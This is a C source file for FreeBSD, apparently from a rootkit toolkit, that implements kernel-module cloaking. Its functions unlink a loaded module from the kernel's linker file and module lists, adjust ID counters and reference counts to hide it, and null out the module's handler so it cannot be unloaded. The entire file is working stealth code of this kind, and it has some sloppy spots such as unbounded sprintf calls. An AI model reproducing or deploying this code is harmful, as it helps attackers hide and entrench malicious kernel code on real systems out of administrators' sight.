/*
 *                                Copyright (C) 2017 by Rafael Santiago
 *
 * This is a free software. You can redistribute it and/or modify under
 * the terms of the GNU General Public License version 2.
 *
 */
#include <freebsd/incantations.h>
#include <freebsd/externals.h>

static struct linker_file *find_kld(const char *name);

static struct module *find_mod(const char *name);

int native_icloak_ko(const char *name) {
    struct linker_file *kld;
    struct module *mp;
    int deleted = 0;

    // INFO(Rafael): I find hold this giant lock is only necessary
    //               in FreeBSD 6.0 or older (not so sure). However,
    //               I will let it holding from 7 or newer.
    mtx_lock(&Giant);
    kld_lock

    if ((kld = find_kld(name)) != NULL) {
        TAILQ_REMOVE(&linker_files, kld, link);
        next_file_id--;
        deleted = 1;
#if __FreeBSD__ > 6
        // WARN(Rafael): I notice an increment by 2 in the reference counter,
        //               but I am not sure if it also occurs in older versions.
        if (linker_files.tqh_first->refs > 2) {
            linker_files.tqh_first->refs -= 2;
        }
#else
        linker_files.tqh_first->refs--;
#endif
        kld = NULL;
    }

    kld_unlock
    mtx_unlock(&Giant);

    sx_xlock(&modules_sx);

    // WARN(Rafael): It will work only if the module name is the same of
    //               the kernel object file.
    if ((mp = find_mod(name)) != NULL) {
        TAILQ_REMOVE(&modules, mp, link);
        nextid--;
        mp = NULL;
    }

    sx_xunlock(&modules_sx);

    return (deleted == 1) ? 0 : 1;
}

int native_icloak_mk_ko_perm(const char *name, void **exit) {
    struct module *mp = NULL;
    struct linker_file *kld;
    int error;

    mtx_lock(&Giant);
    kld_lock

    if ((kld = find_kld(name)) != NULL) {
        mp = (struct module *)&kld->modules;
        kld = NULL;
    }

    if (mp != NULL) {
        if (exit != NULL) {
            exit = (void *)mp->handler;
        }
        mp->handler = NULL;
    }

    error = (mp != NULL && mp->handler == NULL) ? 0 : 1;

    mp = NULL;

    kld_unlock
    mtx_unlock(&Giant);

    return error;
}

int native_icloak_mk_ko_nonperm(const char *name, void *exit) {
    struct module *mp = NULL;
    int error;
    struct linker_file *kld;

    mtx_lock(&Giant);
    kld_lock

    if ((kld = find_kld(name)) != NULL) {
        mp = (struct module *)&kld->modules;
        kld = NULL;
    }

    if (mp != NULL) {
        mp->handler = exit;
    }

    error = (mp != NULL && mp->handler == exit) ? 0 : 1;

    mp = NULL;

    kld_unlock
    mtx_unlock(&Giant);

    return error;
}

static struct linker_file *find_kld(const char *name) {
    struct linker_file *lp;
    char name_ext[255];
    size_t name_size;

    if (name == NULL) {
        return NULL;
    }

    name_size = strlen(name);

    if (name_size < 3 || strcmp((name + name_size - 3), ".ko") != 0) {
        sprintf(name_ext, "%s.ko", name);
    } else {
        sprintf(name_ext, "%s", name);
    }

    TAILQ_FOREACH(lp, &linker_files, link) {
        if (strcmp(lp->filename, name_ext) == 0) {
            return lp;
        }
    }

    return NULL;
}

static struct module *find_mod(const char *name) {
    struct module *mp;
    char mod_name[255], *mn;

    if (name == NULL) {
        return NULL;
    }

    sprintf(mod_name, "%s", name);

    if ((mn = strstr(mod_name, ".ko")) != NULL) {
        *mn = 0;
        mn = NULL;
    }

    TAILQ_FOREACH(mp, &modules, link) {
        if (strcmp(mp->name, mod_name) == 0) {
            goto find_mod_epilogue;
        }
    }

    mp = NULL;

find_mod_epilogue:

    memset(mod_name, 0, sizeof(mod_name));

    return mp;
}
